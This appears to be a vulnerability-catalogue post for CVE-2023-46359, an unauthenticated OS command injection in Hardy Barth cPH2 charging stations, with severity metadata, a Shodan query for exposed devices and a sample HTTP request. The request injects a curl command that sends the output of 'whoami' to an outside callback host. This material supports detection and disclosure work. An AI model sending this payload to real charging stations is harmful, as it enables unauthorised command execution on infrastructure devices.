---
layout: "post"
cve_id: "CVE-2023-46359"
title: "cPH2 Charging Station v1.87.0 - OS Command Injection"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-46359.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-46359.yaml"
author: "mlec"
severity: "critical"
impact: "Unauthenticated attackers can exploit OS command injection through the connectivity check feature to execute arbitrary system commands and completely compromise cPH2 charging station installations.
"
remediation: "Fixed in version 2.0.0"
reference:
  - "https://www.offensity.com/en/blog/os-command-injection-in-cph2-charging-station-200-cve-2023-46359-and-cve-2023-46360/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-46359"
  - "http://hardy.com"
  - "https://github.com/d4n-sec/d4n-sec.github.io"
  - "https://github.com/fkie-cad/nvd-json-data-feeds"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-46359', 'cwe-id': 'CWE-78', 'epss-score': 0.93632, 'epss-percentile': 0.99826, 'cpe': 'cpe:2.3:h:hardy-barth:cph2_echarge:-:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'hardy-barth', 'product': 'cph2_echarge', 'shodan-query': 'html:"Salia PLCC"'}"
tags:
  - "cve2023"
  - "cve"
  - "salia-plcc"
  - "cph2"
  - "rce"
  - "hardy-barth"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
An OS command injection vulnerability in Hardy Barth cPH2 Ladestation v1.87.0 and earlier, may allow an unauthenticated remote attacker to execute arbitrary commands on the system via a specifically crafted arguments passed to the connectivity check feature.


## üåê HTTP Request
```nohighlight
GET /connectioncheck.php?ip=127.0.0.1%20%26%26%20curl%20http%3A%2F%2F%24(whoami).d5irtvple0o301499g7gk6wh9pkppii17.oast.site HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2 rv:2.0; mai-IN) AppleWebKit/533.27.1 (KHTML, like Gecko) Version/5.0 Safari/533.27.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

